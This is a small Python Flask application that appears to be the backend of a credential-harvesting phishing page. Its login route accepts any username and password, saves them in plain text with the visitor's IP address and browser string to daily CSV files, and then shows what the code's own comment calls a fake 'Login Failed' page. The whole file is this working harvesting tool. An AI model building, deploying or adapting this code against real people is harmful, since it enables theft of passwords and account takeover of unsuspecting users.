from flask import Flask, request, render_template, redirect, url_for
import os, csv
from datetime import datetime

app = Flask(__name__)

# In-memory log for simplicity. In a real scenario, you might want to log to a file or database.
log = []

LOG_DIR = "logs"

os.makedirs(LOG_DIR, exist_ok=True)

def write_log(log_data):
    """Write the log data to a CSV file named after the current date."""
    # Get the current date to use as the filename
    current_date = datetime.now().strftime('%Y-%m-%d')
    log_filename = os.path.join(LOG_DIR, f"{current_date}.csv")

    # Check if the file exists; if not, create it and write the header
    file_exists = os.path.isfile(log_filename)
    
    with open(log_filename, 'a', newline='') as csvfile:
        fieldnames = log_data.keys()
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        
        if not file_exists:
            writer.writeheader()
        
        writer.writerow(log_data)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    # Capture and log the IP address, user-agent, and form data
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    username = request.form.get('username')
    password = request.form.get('password')

    log_entry = {
        'ip': user_ip,
        'user_agent': user_agent,
        'username': username,
        'password': password
    }
    write_log(log_entry)

    # Redirect to a fake "Login Failed" page
    return redirect(url_for('login_failed'))

@app.route('/login_failed')
def login_failed():
    return render_template('login_failed.html')

@app.route('/logs')
def show_logs():
    return render_template('logs.html', log=log)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
